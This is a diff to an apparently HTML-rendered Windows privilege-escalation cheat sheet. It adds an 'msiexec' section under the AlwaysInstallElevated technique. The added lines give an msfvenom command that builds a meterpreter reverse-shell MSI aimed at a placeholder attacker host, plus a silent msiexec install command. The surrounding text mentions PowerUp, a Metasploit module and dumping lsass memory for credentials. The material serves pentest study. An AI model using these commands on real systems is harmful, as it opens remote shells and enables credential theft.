@@ -363,6 +363,8 @@ Kernel比較常見的就是利用 windows-kernel-exploits 取得相關cve來打
 <h5 id="Powershell-PowerUp-5"><a href="#Powershell-PowerUp-5" class="headerlink" title="Powershell(PowerUp)"></a>Powershell(PowerUp)</h5><p><code>Write-UserAddMSI</code><br><img src="https://i.imgur.com/XWJvyhK.png" alt=""></p>
 <p><img src="https://i.imgur.com/V4ZNczf.png" alt=""></p>
 <h5 id="Metasploit-5"><a href="#Metasploit-5" class="headerlink" title="Metasploit"></a>Metasploit</h5><p><code>exploit/windows/local/always_install_elevated</code><br><a href="https://www.rapid7.com/db/modules/exploit/windows/local/always_install_elevated" target="_blank" rel="noopener">https://www.rapid7.com/db/modules/exploit/windows/local/always_install_elevated</a></p>
+<h5 id="msiexec"><a href="#msiexec" class="headerlink" title="msiexec"></a>msiexec</h5><p><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=[ip] lport=[port] -f msi -o alwe.msi</code></p>
+<p><code>msiexec /quiet /qn /i alwe.msi</code></p>
 <h2 id="Password-Mining"><a href="#Password-Mining" class="headerlink" title="Password Mining"></a>Password Mining</h2><h3 id="Memory"><a href="#Memory" class="headerlink" title="Memory"></a>Memory</h3><h4 id="Exploitation-7"><a href="#Exploitation-7" class="headerlink" title="Exploitation"></a>Exploitation</h4><ol>
 <li>Write the running process (lsass.exe) memory space to a file.</li>
 <li>Search for meaningful data.<br>(example is use strings &amp; grpe to search)</li>
